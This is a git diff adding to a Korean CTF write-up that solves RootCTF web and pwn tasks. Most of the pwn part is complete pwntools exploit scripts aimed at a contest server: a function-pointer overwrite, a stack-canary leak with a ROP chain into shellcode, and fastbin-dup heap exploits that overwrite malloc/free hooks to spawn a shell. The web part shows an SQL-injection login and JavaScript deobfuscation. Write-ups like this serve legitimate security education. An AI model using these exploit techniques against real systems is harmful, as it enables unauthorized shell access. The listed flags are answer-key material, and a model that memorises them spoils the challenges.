@@ -493,3 +493,751 @@ int __cdecl sub_412D70(int a1, int a2)
 ```
 
 저렇게 Flag를 출력하는 함수를 정상작동하도록 동적 디버깅을 하면서 Debug 여부나, 바이너리에서 체크하는 flag들을 다 우회해주면 flag가 출력된다.
+
+
+![ex_screenshot](./jpg/rev1.png)
+
+(바이너리에서는 Helln으로 나오지만 hint에 Hello라고 수정되었다.)
+
+FLAG : FLAG{Hello_SdhsR}
+<br><br><br>
+
+## Login 50 (Web)
+```
+로그인 페이지인데 로그인이 안된다... 
+로그인을 성공하고 짱해커가 되어보자!!
+Hint : Array, length<6
+Hint2 : Get으로 배열을 전송하는 방법, sql injection
+Link
+```
+접속하니 php소스가 있었고, 소스안에 flag가 base64로 인코딩 되어 존재했다.
+
+```php
+<?php 
+include("dbcon.php"); 
+$pw=$_GET['pw']; 
+$fpw=$_GET['pw'][1]; 
+if(strlen($fpw)>5){ 
+    echo "<script>alert('no hack~');location.href='login.html'</script>"; 
+} 
+$query="select * from Login where pw='$fpw'"; 
+$info=mysqli_query($con,$query); 
+$result=mysqli_fetch_array($info); 
+if($result['id']){ 
+    setcookie("flag","VmxjeE1FNUdSbk5UV0hCclUwVmFiMWxzVm1GTlZtUnhVbFJXYVZKdGVGcFdSM0JYWWxaV1ZVMUVhejA9"); 
+    echo "<script>location.href='flag.html'</script>"; 
+} 
+highlight_file("login.php"); 
+?>
+```
+
+FLAG : FLAG{jjang_easy}
+<br><br><br>
+
+## 보물찾기 149 (Web)
+```
+홈페이지 내에 존재하는 플레그를 찾아보세염!
+```
+
+http://sdhsroot.kro.kr/vendor/bootstrap/css/bootstrap.min.css 에 FLAG가 있었다.
+
+FLAG : FLAG{bootstrap_1s_jj4ng}
+<br><br><br>
+
+## SPACE PROSPECTION 529 (Web)
+
+```
+2023년... SPACE PROSPECTION라는 회사가 화성에 진출했다.
+회사의 사이트에 들어가 핵심 기술을 가져오자!!
+Link
+```
+http://sdhsroot.kro.kr/BlackOut/singlepost.html 에 보면 핵심기술을 작업하던 도중 정전이나서 날려먹었다고 한다.
+혹시나해서 http://sdhsroot.kro.kr/BlackOut/.singlepost.html.swp 에 들어가봤더니 있었다.
+
+FLAG : FLAG{FROM_2017_FLAG}
+<br><br><br>
+
+## Phishing 600 (Web)
+```
+문제에 오류가 있을수도...
+Hint1 : 꺠진 문자열이 플레그일수도,,,
+Link
+```
+
+들어가서 자바스크립트를 끄면 http://sdhsroot.kro.kr/Phishing/asd.php 에 접속할 수 있는데, 소스는 다음과 같다.
+```javascript
+<script>
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4P(4H(p,a,c,k,e,r){e=4H(c){4G(c<a?\'\':e(4R(c/a)))+((c=c%a)>35?4I.4M(c+29):c.4Q(36))};4J(!\'\'.4K(/^/,4I)){4L(c--\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'),0,{}))\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\',2j,2l,\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||25|24|26|28|27|2a|2
+
+...
+...
+...
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||49|4a|4b|4e|4d|4c|4f|4g|4h|4i|4j|4k|4l|4m|4p|4q|4r|4s|4t|4u|4v|4w|4x|4y|4z|4A|4B|4C|4D|4E|4F|4n\\\'.4m(\\\'|\\\'),0,{}))\',4S,4V,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||4G|4H|4L|4K|4J|4I|4R|4M|4N|4O|4P|4Q|4S|4T|4W|4X|4Y|4Z|50|51|52|53|54|55|56|57|58|59|5a|5b|5c|5d|4U\'.4T(\'|\'),0,{}))',62,324,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|new|RegExp|eval|toString|parseInt|62|split|for|290|var|257|123|225|125|194|70|161|128|200|95|61|else|continue|alert|65|76|71'.split('|'),0,{}))
+</script>
+```
+
+jsbeautifier.org에서 난독화를 풀고 보면 아래와 같다.
+
+```javascript
+var b = 200;
+for (a = 0; a <= 20; a++) {
+    b = b + ((a * b) - (a / b));
+    if (a == 0) b = 70;
+    else if (a == 1) b = 76;
+    else if (a == 3) b = 71;
+    else if (a == 2) b = 65;
+    else if (a == 4) b = 123;
+    else if (a == 20) b = 125;
+    else if (a == 5) {
+        continue
+    } else if (a == 6) {
+        alert("코");
+        continue
+    } else if (a == 7) {
+        alert("드");
+        continue
+    } else if (a == 8) {
+        alert("속");
+        continue
+    } else if (a == 9) {
+        alert("에");
+        continue
+    } else if (a == 10) {
+        alert(".");
+        continue
+    } else if (a == 11) {
+        alert(".");
+        continue
+    } else if (a == 12) {
+        alert(".");
+        continue
+    } else if (a >= 4 && a <= 20) {
+        continue
+    }
+    alert(String.fromCharCode(b))
+}
+```
+
+b가 반복문마다 계속 바뀌는걸 의심해서 아래와같이 코드를 바꾸면 flag를 출력한다.
+
+```javascript
+flag = ''
+var b = 200;
+for (a = 0; a <= 20; a++) {
+    b = b + ((a * b) - (a / b));
+    if (a == 0) b = 70;
+    else if (a == 1) b = 76;
+    else if (a == 3) b = 71;
+    else if (a == 2) b = 65;
+    else if (a == 4) b = 123;
+    else if (a == 20) b = 125;
+    flag += String.fromCharCode(b);
+}
+console.log(flag)
+```
+
+FLAG : FLAG{ˡᐭꅭ곚삍䘐䣇눛뵼ᩎꓨᶐㆰ}
+<br><br><br>
+
+
+## Point to pointer! 529 (Pwn)
+```
+넘나 쉬운 문제 당신도 풀 수 있습니다!
+nc 222.110.147.52:42632
+Link
+```
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char v4; // [rsp+Fh] [rbp-11h]
+  void *buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  buf = malloc(0x30uLL);
+  *(buf + 2) = sub_400796;
+  (*(buf + 2))(48LL, 0LL);
+  read(0, buf, 0x64uLL);
+  puts("Retry?(Y/N)");
+  __isoc99_scanf("%c", &v4);
+  if ( v4 == 'Y' )
+    (*(buf + 2))();
+  else
+    puts("Good bye");
+  return 0LL;
+}
+```
+위 소스를 보면 입력한 값으로 점프하는데 sub_4007A7()가 쉘을 실행시켜주는 함수다. 그래서 그냥 sub_4007A7()로 뛰면된다.
+
+```python
+from pwn import *
+
+s = remote('222.110.147.52',42632)
+
+system = 0x4007a7
+
+s.sendlineafter('RootCTF!',p64(system) * 8)
+s.sendline('Y')
+s.interactive()
+```
+
+FLAG : FLAG is FLAG{P0InT_2_pOiNt_2_PO1t3R!}
+<br><br><br>
+
+## Factorization 889 (Pwn)
+```
+열심히 수련하여 샌드백을 터뜨리자!
+nc 222.110.147.52 6975
+
+Link
+```
+
+특정 조건을 만족하면 skill에 4번메뉴에서 bof가 발생한다.
+```c
+unsigned int __cdecl skill(_DWORD *damage, _DWORD *base_num, _DWORD *a3, _DWORD *a4, _DWORD *play_count, void *a6)
+{
+  int v7; // [esp+18h] [ebp-8h]
+  unsigned int v8; // [esp+1Ch] [ebp-4h]
+
+  v8 = __readgsdword(0x14u);
+  sub_8048A10();
+  __isoc99_scanf("%d", &v7);
+  if ( v7 != 1 || *base_num > 14 )
+  {
+    if ( v7 != 2 || *a3 > 15 )
+    {
+      if ( v7 != 3 || *a4 > 16 )
+      {
+        if ( (v7 != 4 || *play_count != 2985984) && *damage != 10000000 )
+        {
+          puts("I can't\n");
+        }
+        else
+        {
+          puts("abracadabra surisurimasuri yap!\n");
+          printf("Input your attack:");
+          getchar();
+          read(0, a6, 0x100u);
+          printf("\n%s", a6);
+        }
+      }
+      else
+      {
+        puts("There's no effect too3\n");
+        *damage += 30;
+        ++*a4;
+        ++*play_count;
+      }
+    }
+    else
+    {
+      puts("There's no effect too2\n");
+      *damage += 25;
+      ++*a3;
+      ++*play_count;
+    }
+  }
+  else
+  {
+    puts("There's no effect too1\n");
+    *damage += 20;
+    ++*base_num;
+    ++*play_count;
+  }
+  return __readgsdword(0x14u) ^ v8;
+}
+```
+
+play_count가 2985984가 되면 bof가 터지는 루틴이 실행되는데, 바이너리를 대충 보니까 그냥 attack이랑 skill이랑 전부다 한번씩 써주는걸 몇번 반복하면 대충 맞을꺼 같길래 해봤더니 딱맞아서 조건 맞추고 rop해서 풀었다.
+그리고 bss에 스택피벗해서 빠르게 풀려고했는데 안돼가지고 그냥 쉘코드올려서 풀었다.
+
+```python
+from pwn import *
+
+#s = process('./sandbag')
+s = remote('222.110.147.52',6975)
+
+e = ELF('./sandbag')
+l = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+pr = 0x08048465
+pppr = 0x08048f49
+pebpr = 0x08048f4b
+leaveret = 0x08048598
+
+def attack(index):
+	s.sendlineafter('t\n---------------------------','1')
+	s.sendlineafter('e\n---------------------------',index)
+
+def skill(index):
+	s.sendlineafter('t\n---------------------------','2')
+	s.sendlineafter('l\n---------------------------',index)
+
+def rest(index):
+	s.sendlineafter('t\n---------------------------','3')
+	s.sendlineafter('p\n---------------------------',index)
+
+for i in range(12):
+	for i in range(1,5):
+		attack(str(i))
+
+	for i in range(1,4):
+		skill(str(i))
+
+rest('4')
+
+pause()
+
+skill('4')
+payload = 'A' * 0x41
+s.sendafter('your attack:',payload)
+s.recvuntil('A' * 0x41)
+canary = u32("\x00"+s.recv(3))
+log.info("CANARY : " + hex(canary))
+
+payload = 'A' * 0x40 + p32(canary) + "B" * 0x4
+payload += p32(e.plt['puts']) + p32(pr) + p32(e.got['puts'])
+payload += p32(e.plt['read']) + p32(pppr) + p32(0) + p32(e.bss() + 0x100) + p32(0x100)
+payload += p32(pebpr) + p32(e.bss() + 0x100 - 0x4) + p32(leaveret)
+
+skill('4')
+s.sendafter('your attack:',payload)
+
+s.sendlineafter('t\n---------------------------','6')
+
+s.recvuntil('Good Bye~\n')
+libc_base = u32(s.recv(4)) - l.symbols['puts']
+
+log.info("LIBC LEAK : " + hex(libc_base))
+
+binsh = 0x15b9ab
+
+pause()
+payload2 = p32(libc_base + l.symbols['mprotect'])
+payload2 += p32(pppr) + p32(e.bss()-0x40) + p32(0x2000) + p32(7)
+payload2 += p32(e.bss() + 0x100 + len(payload2) + 4)
+payload2 += asm(shellcraft.sh())
+
+s.sendline(payload2)
+
+s.interactive()
+```
+
+FLAG : Flag is FLAG{dO_y0u_kNOw_F@ct0rIzAtion?}
+<br><br><br>
+
+## Allocate 991 (Pwn)
+```
+There are many allocation methods in this world.
+Learn a lot and get shell
+222.110.147.52:28417
+Link
+```
+
+### Reversing
+1. Allocate - 여러 종류로 할당할 수 있다.
+2. Modified - 할당한 heap중 calloc으로 할당한 것만 수정할 수 있다.
+3. Confirm - 할당한 heap중 calloc으로 할당한 것만 보여준다.
+4. Bitwise operation - 비트연산..? (익스할때 필요없어서 안봄)
+1222. free - 히든메뉴로 자유롭게 free할 수 있다.
+
+### Vulnerability
+히든메뉴에서 malloc_chunk를 3번 free할 수 있는데 초기화가 안되서 fastbin duplicate를 발생시킬 수 있다.
+
+### Exploit
+leak은 calloc_chunk가 realloc_chunk로 변할때 초기화가 되지않는다는 점에서 발생한다. 즉 calloc_chunk를 출력할 때 unsortedbin_chunk의 fd,bk를 출력시키면 libc를 얻을 수 있다. 이후에는 malloc hook을 one_shot 가젯으로 덮어주면 된다.
+
+```python
+from pwn import *
+
+#s = process('./Allocate')
+s = remote('222.110.147.52',28417)
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def malloc(size,data):
+	s.sendlineafter('> ','1')
+	s.sendlineafter('> ','1')
+	s.sendlineafter('size: ',size)
+	s.sendafter('data: ',data)
+	s.sendlineafter('> ','6')
+
+def calloc(size,data):
+	s.sendlineafter('> ','1')
+	s.sendlineafter('> ','2')
+	s.sendlineafter('size: ',size)
+	s.sendafter('data: ',data)
+	s.sendlineafter('> ','6')
+
+def realloc(size,alloc_type,index,data):
+	s.sendlineafter('> ','1')
+	s.sendlineafter('> ','3')
+	s.sendlineafter('size: ',size)
+	s.sendlineafter('> ',alloc_type)
+	s.sendlineafter('idx: ',index)
+	s.sendafter('data',data)
+	s.sendlineafter('> ','6')
+
+def free(alloc_type,index):
+	s.sendlineafter('> ','1222')
+	s.sendlineafter('> ',alloc_type)
+	s.sendlineafter('index: ',index)
+
+
+pause()
+
+malloc(str(0x108),'A')
+malloc(str(0x28),'A')
+realloc(str(0x208),'1','0','B')
+calloc(str(0x28),'A' * 0x28)
+realloc(str(0x108),'2','0','B' * 8 * 6)
+
+s.sendlineafter('> ','3')
+s.recvuntil('B' * 8 * 6)
+libc_base = u64(s.recv(6) + "\x00" * 2) - 0x3c4b78 // leak
+
+log.info("LIBC_BASE : " + hex(libc_base))
+
+malloc(str(0x68),'A')
+malloc(str(0x68),'A')
+free('1','2')
+free('1','3')
+free('1','2') // fastbin dup
+malloc(str(0x68),p64(libc_base+l.symbols['__malloc_hook'] - 0x23))
+malloc(str(0x68),'A')
+malloc(str(0x68),'A')
+
+oneshot = libc_base + 0xf1117
+malloc(str(0x68),'A' * 0x13 + p64(oneshot))
+s.interactive()
+```
+
+FLAG : FLAG is FLAG{S0lo_Att4cks_the_H3ap_during_Chr1s7mas}
+<br><br><br>
+
+## WarOfTheGods 991 (Pwn)
+```
+Can you win?
+nc 222.110.147.52:5265
+HINT1: fastbin dup into stack
+Link
+```
+
+### Introduction
+힌트가 fastbin dup into stack이길래 처음엔 그거로 해보려했는데 귀찮아질꺼 같아서 다른방법 찾다가 일반적인 fastbin dup로 풀었다. 그러니 정풀이는 아닌거같다.
+
+### Reversing
+바이너리 분석하기전에 취약점을 찾아서 리버싱을 많이 안하고 익스했다.
+1. Character management - 캐릭터를 만듬
+	1. Human
+		1. birth (캐릭생성)<br>
+		2. death (캐릭삭제)<br>
+		3. birthList (캐릭보기)<br>
+		4. edit (캐릭이름수정)<br>
+	2. God
+		1. Creating (캐릭생성)<br>
+		2. Killing (캐릭삭제)<br>
+		3. New_God_List (캐릭보기)<br>
+		4. Editing (캐릭이름수정)<br>
+	3. DemiGod
+		1. Craete (캐릭생성)<br>
+		2. Delete (캐릭삭제)<br>
+		3. List (캐릭보기)<br>
+		4. Edit (캐릭이름수정)<br>
+2. Colosseum - 싸움 (익스에 안써서 잘은 모르겠다)
+3. Game way - 게임방법 출력
+
+### Vulnerability
+DemiGod은 할당받을때 부모를 Human에서 하나, God에서 하나선택해야한다. 그런데 DemiGod을 삭제하면 부모 God의 name이 free된다. 그 시점에서 부모 God이 free된 name을 가르키므로 Use-After-Free가 발생한다. 또한 부모 God을 삭제하면 한번더 name을 free해서 double free가 발생한다. 
+
+### Exploit
+Leak은 unsorted bin chunk의 fd,bk를 이용하여 libc를 leak하면 된다. (할당시 chunk초기화를 진행하지 않음) 익스는 약간 복잡한데, 아래와같은 과정을 통하여 할 수 있다.
+
+1. libc_leak (using unsorted chunk)
+2. create human chunk
+3. create god chunk
+4. create demigod chunk
+5. free demigod chunk (UAF!!) (god name chunk size is 0x30)
+6. create human chunk (god name -> human chunk)
+7. create human chunk
+8. delete human chunk(6) (free god_name)
+9. delete human chunk(7)
+10. delete demigod chunk(6) (free demigod) (Double Free!!)
+11. create human chunk (weapon size is not 0x30)
+12. create human chunk (weapon size is 0x30)
+13. overwrite free_hook in human chunk
+14. free_hook -> system (using edit)
+15. free("/bin/sh")
+
+(코드안 주석은 기분대로 단거니까 무시해주세요)
+```python
+from pwn import *
+
+#s = process('./WarOfTheGods')
+s = remote('222.110.147.52',5265)
+l = ELF("/lib/i386-linux-gnu/libc.so.6")
+
+def create(character_type):
+	s.sendlineafter('> ','1')
+	s.sendlineafter('> ',character_type)
+	s.sendlineafter('> ','1')
+pause()
+
+create('1')
+s.sendlineafter(': ',str(0x100)) # len
+s.sendlineafter(': ',"A" * 0x30) # name
+s.sendlineafter('? ','2') # weapon
+s.sendlineafter(': ',"1") # str
+s.sendlineafter(': ',"1") # int
+s.sendlineafter(': ',"1") # speed
+
+s.sendlineafter('> ','2')
+s.sendlineafter(': ',"4") # speed
+
+s.sendlineafter('> ','1')
+s.sendlineafter(': ',str(0x100)) # len
+s.sendafter(': ',"A") # name
+s.sendlineafter('? ','2') # weapon
+s.sendlineafter(': ',"1") # str
+s.sendlineafter(': ',"1") # int
+s.sendlineafter(': ',"1") # speed
+
+s.sendlineafter('> ',"3") # view
+
+s.recvuntil('4\nHuman NAME: ')
+libc_base = u32(s.recv(8)[4:]) - 0x1b27b0
+log.info("LIBC_BASE : " + hex(libc_base))
+
+s.sendlineafter('> ',"5") # back
+s.sendlineafter('> ',"2") # god
+s.sendlineafter('> ',"1") # create
+
+for i in range(4):
+	s.sendlineafter(': ','1234')
+
+s.sendlineafter(': ',str(0x30)) # len
+s.sendlineafter(': ','A') # name
+s.sendlineafter(': ','B') # abilities
+
+# create demigod --- god
+s.sendlineafter('> ',"5") # back
+s.sendlineafter('> ',"3") # demigod
+s.sendlineafter('> ',"1") # create
+
+s.sendlineafter(': ','4') # dad
+s.sendlineafter(': ','4') # mom
+s.sendlineafter(': ','30') # len
+s.sendlineafter(': ','A') #name
+s.sendlineafter(': ','A') # ability
+s.sendlineafter('> ','2')
+s.sendlineafter(': ',"0") # delete
+
+# create human
+s.sendlineafter('> ',"5") # back
+s.sendlineafter('> ',"1") # create
+s.sendlineafter('> ',"1") # human
+s.sendlineafter('> ',"1") # create
+s.sendlineafter(': ',str(0x60)) # len
+s.sendlineafter(': ','A') # name
+s.sendlineafter('? ','2') # weapon
+s.sendlineafter(': ',"1") # str
+s.sendlineafter(': ',"1") # int
+s.sendlineafter(': ',"1") # speed
+
+s.sendlineafter('> ',"1") # create
+s.sendlineafter(': ',str(0x60)) # len
+s.sendlineafter(': ','/bin/sh') # name
+s.sendlineafter('? ','2') # weapon
+s.sendlineafter(': ',"1") # str
+s.sendlineafter(': ',"1") # int
+s.sendlineafter(': ',"1") # speed
+
+# del human * 2
+s.sendlineafter('> ',"2") # del
+s.sendlineafter(': ',"5")
+s.sendlineafter('> ',"2") # del
+s.sendlineafter(': ',"4")
+
+# del god -- double free --
+s.sendlineafter('> ',"5") # back
+s.sendlineafter('> ',"2") # god
+s.sendlineafter('> ',"2") # del
+s.sendlineafter(': ',"4")
+
+# create human
+s.sendlineafter('> ',"5") # back
+s.sendlineafter('> ',"1") # human
+s.sendlineafter('> ',"1") # create
+s.sendlineafter(': ',str(0x60)) # len
+s.sendlineafter(': ','A') # name
+s.sendlineafter('? ','2') # weapon
+s.sendlineafter(': ',"1") # str
+s.sendlineafter(': ',"1") # int
+s.sendlineafter(': ',"1") # speed
+
+s.sendlineafter('> ',"5") # back
+s.sendlineafter('> ',"1") # human
+s.sendlineafter('> ',"1") # create
+s.sendlineafter(': ',str(0x30)) # len
+s.sendlineafter(': ',p32(libc_base + l.symbols['__free_hook'])) # name
+s.sendlineafter('? ','2') # weapon
+s.sendlineafter(': ',"1") # str
+s.sendlineafter(': ',"1") # int
+s.sendlineafter(': ',"1") # spee
+
+# overwrite __free_hook
+s.sendlineafter('> ',"4") # edit
+s.sendlineafter(': ',"4") # human
+s.sendlineafter(' your name:',p32(libc_base + l.symbols['system']))
+
+s.sendlineafter('> ',"1") # human
+s.sendlineafter('> ',"2") # del
+s.sendlineafter(': ',"6") # shell
+
+s.interactive()
+```
+
+FLAG : FLAG is FLAG{E@sy_I5_it_3asy?_It_is_ea5y_!!}
+<br><br><br>
+
+## HS_CLUB 997 (Pwn)
+```
+Hacking Create and grow security clubs!
+222.110.147.52:35163
+Hint: sub_4009e0 함수에 취약점이 있다
+Link
+```
+
+### Introduction
+사실 이것도 힌트를보면 sub_4009e0에 취약점이 있다고 하는데 아마 1바이트 null overflow를 말하는것 같다. 그 취약점을 바이너리 열자마자 보긴했는데, 만약 저걸로 익스하면 unsafe unlink로 익스해야하고 힙 풍수를 맞춰주는게 귀찮아서 fastbin dup로 풀었다. 이것도 정풀이는 아닌듯싶다. 아마 첫번째로 생각한 방법이 출제자의 의도였을것이라 생각한다.
+
+### Reversing
+1. add (학생을 할당한다)
+2. delete (해제)
+3. edit (수정)
+4. view (보기)
+5. club (club 메뉴)
+	1. Add (Club 추가)
+	2. Delete (삭제)
+	3. Edit (수정)
+	4. view (보기)
+	5. Join (학생을 이 클럽에 가입시킴)
+	6. Back
+	
+### Exploit
+Club을 추가할 때 UAF가 발생한다. Club의 구조체는 아래와 같다.
+```c
+struct club
+{
+  char *club_name;
+  __int64 *club_name_size;
+  __int64 *student1;
+  __int64 *student2;
+  __int64 *student3;
+  __int64 *student4;
+  __int64 *student5;
+  __int64 *club1;
+  __int64 *club2;
+  __int64 *club3;
+  __int64 *club4;
+  __int64 *club5;
+};
+```
+이 구조체에서 club1~5와 student1~5를 초기화하지않아서 UAF가 발생하는데, 그러면 자유롭게 free와 leak을 할 수 있게된다. 그래서 바로 fastbin dup로 익스했다.
+
+```python
+from pwn import *
+
+#s = process('./HS_CLUB')
+s = remote('222.110.147.52',35163)
+e = ELF('./HS_CLUB')
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def add(size,content):
+	s.sendlineafter('> ','1')
+	s.sendlineafter('> ',size)
+	sleep(0.05)
+	s.sendline(content)
+
+def club_add(size,content,track,you_track):
+	s.sendlineafter('> ','1')
+	s.sendlineafter('> ',size)
+	s.sendlineafter('> ',content)
+	s.sendlineafter('> ',track)
+	s.sendlineafter('> ',you_track)
+
+
+
+def delete(index):
+	s.sendlineafter('> ','2')
+	s.sendlineafter('> ',index)
+
+def club(index):
+	s.sendlineafter('> ','5')
+	s.sendlineafter('> ',index)
+
+member = 0x6030C0
+
+pause()
+
+add(str(0x20),'A' * 0x20)
+add(str(0x68),(p64(e.got['puts']) + p64(member)) * 6)
+delete('1')
+club('0')
+club_add(str(0x20), 'C' * 3, '1', '1')
+club('0')
+s.sendlineafter('> ','4')
+
+s.recvuntil('AAAA | ')
+heap_base = u32(s.recv(4)) - 0x10
+s.recvuntil(' | ')
+libc_base = u64(s.recv(6) + "\x00" * 2) - l.symbols['puts']
+
+log.info('HEAP BASE : ' + hex(heap_base))
+log.info('LIBC BASE : ' + hex(libc_base))
+delete('0')
+
+add(str(0x68),'A' * 0x20)
+add(str(0x68),'B' * 0x58 + p64(0xe1))
+add(str(0x68),'A' * 0x20)
+delete('0')
+delete('1')
+delete('2')
+
+#debug()
+add(str(0x20),'A' * 0x20)
+add(str(0x68),'C' * 0x10 + 'A' * 8 * 5 + p64(heap_base + 0x170))
+delete('1')
+club('0')
+club_add(str(0x20), 'D' * 0x20, '1', '1')
+add(str(0x20),'A' * 0x20)
+club('0')
+sleep(0.05)
+delete('0')
+#s.sendlineafter('> ','4')
+
+oneshot = libc_base + 0xf1117
+add(str(0xe0),'F' * 0x8 + p64(0x71) + p64(libc_base + l.symbols['__malloc_hook'] - 0x23))
+add(str(0x68),'F' * 0x8)
+add(str(0x68), 'A' * 0x13 + p64(oneshot))
+
+s.interactive()
+```
+FLAG : FLAG is FLAG{Null_by7e_t0_control_th3_club :)}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
